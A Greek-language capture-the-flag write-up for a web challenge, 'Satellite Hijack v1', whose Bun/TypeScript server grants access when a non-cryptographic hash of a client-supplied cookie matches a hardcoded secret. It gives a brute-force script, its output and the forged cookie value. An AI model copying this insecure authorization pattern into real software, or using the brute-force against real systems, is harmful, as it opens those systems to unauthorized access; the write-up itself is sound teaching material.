# Writeup for Satellite Hijack v1

| Δοκιμασία | Satellite Hijack v1 |
| :------- | :----- |
| Δυσκολία | Εύκολη |
| Κατηγορία | Παγκόσμιος Ιστός (Web) |
| Λύσεις | 15 |
| Πόντοι | 355 |

## Περιγραφή Δοκιμασίας

Η περιγραφή της δοκιμασίας δεν μας δίνει πληροφορίες για το τι πρέπει να κάνουμε, αλλά μας δίνεται μια ιστοσελίδα και ο κώδικας της. Οπότε μπορούμε να ξεκινήσουμε από την ανάλυσή του κώδικα.

## Ανάλυση

Κοιτώντας τον κώδικα που μας δίνεται, βλέπουμε πως πρόκριτε για μια web εφαρμογή γραμμένη σε [TypeScript](https://www.typescriptlang.org/) η οποία τρέχει πάνω σε [Bun](https://bun.sh/).

Ξεκινάμε ψάχνοντας πως θα μπορούσαμε να πάρουμε την σημαία, βρίσκουμε πως η εφαρμογή υλοποιεί ένα `/flag` endopoint (μέσα στο αρχείο `app.ts`) το οποίο μπορεί να εκτυπώσει την σημαία αν ο χρήστης είναι `authorized`:
```typescript
.get(
  "/flag",
  async ({ layout, flagPage, userId, authorized, redirect }) => {
    if (!authorized) return redirect("/"); // Αν ο χρήστης δεν είναι authorized κάνει μετάβαση στην αρχική σελίδα αυτόματα

    const $ = cheerio.load(Buffer.from(await layout().arrayBuffer()));

    $("#user").html(userId);
    $(".link").removeClass("has-text-info");
    $("#flag-link").addClass("has-text-info");

    $("#content").html(await flagPage().text()); // Εκτύπωση της σημαίας στην σελίδα
    $("#flag").html(flag);
    return $.html();
  }
)
```

Στο ίδιο αρχείο βρίσκουμε και την συνθήκη με την οποία αξιολογείτε αν ένας χρήστης είναι η όχι `authorized` (στον παρακάτω κώδικα έχουμε προσθέσει κώδικα για την επεξήγηση του):
```typescript
const hashed = (data: string) => Bun.hash(data).toString();
// ...
const secret = "2842816338533097556";
// ...
.resolve(({ headers, cookie }) => {
  let userId = newUser(), // Αρχικά θεωρεί πως μάλλον είναι ένας καινούριος χρήστης
    authorized = false; // Αρχικά θεωρεί πως ο χρήστης δεν είναι authorized

  if (headers.user) { // Αν δίνεται το header "user" πάνω στο HTTP request
    userId = headers.user; // Τότε η εφαρμογή θεωρεί πως αυτό είναι και το ID του χρήστη
  }

  if (cookie.user.value) { // Αν δίνεται ένα cookie με το όνομα "user"
    try {
      userId = atob(cookie.user.value); // Θεωρεί πως το ID είναι αποθηκευμένο στο cookie αυτό σε Base64 μορφή, οπότε το αποκωδικοποιεί και το χρησιμοποιεί σαν user id
    } catch (e) {
      userId = newUser(); // Αν υπάρξει πρόβλημα στην αποκωδικοποίηση, θεωρούμε πως είναι κάποιος καινούριος χρήστης
    }
  }

  authorized = hashed(userId) === secret; // Αν το ID του χρήστη το περάσουμε από την συνάρτηση "hashed(<value>)" και το αποτέλεσμα είναι ίδιο με το secret, τότε ο χρήστης είναι authorized

  cookie.user.value = btoa(userId);
  return { userId, authorized };
})
```

Βάση του παραπάνω κώδικα καταλαβαίνουμε ότι αν βρούμε την τιμή του userid για την οποία το αποτέλεσμα της συνάρτησης `hashed` είναι `2842816338533097556`, τότε θα μπορέσουμε να γίνουμε `authorized`, για να πάρουμε την σημαία.

## Επίλυση

Για να βρούμε την τιμή του user ID που θέλουμε, μπορούμε να γράψουμε ένα κώδικα ο οποίος να δοκιμάσει πολλές διαφορετικές τιμές   μέχρι να βγει το αποτέλεσμα που θέλουμε:


```typescript
// The hash function
const hashed = (data: string) => Bun.hash(data).toString(); // η συνάρτηση hashed που χρησιμοποιεί ο server

// Hash to break
const targetHash = "2842816338533097556"; // Το αποτέλεσμα που θέλουμε να βρούμε
console.log('Target Hash:', targetHash);

// Loop through all possible combinations
process.stdout.write("Bruteforcing [0%]");
for (let i = 0; i <= 999_999_999; i++) { // δοκιμή όλων των τιμών από 0 μέχρι 999.999.999
    if (hashed(i.toString()) == targetHash) { // αν βρήκαμε την τιμή
        console.log(`\nMatch found: ${i}`); // εκτύπωση της τιμής για το user id που θα μας κάνει `authorized`
        break;
    }
    if (i % 10_000_000 === 0) {
        process.stdout.write(`\rBruteforcing [${Math.round(i * 100/999_999_999)}%]`);
    }
}
```

Εκτελώντας τον κώδικά μας βρίσκουμε μια τιμή για το user id:
```
$ bun ./attack.ts
Target Hash: 2842816338533097556
Bruteforcing [70%]
Match found: 704515504
```

Οπότε μπορούμε να την μετατρέψουμε σε Base64 και να την βάλουμε στο user cookie.
```javascript
btoa('704515504'); // 'NzA0NTE1NTA0'
```

Στην συνέχεια, μπορούμε απλά να φορτώσουμε την σελίδα που θα μας δώσει την σημαία.
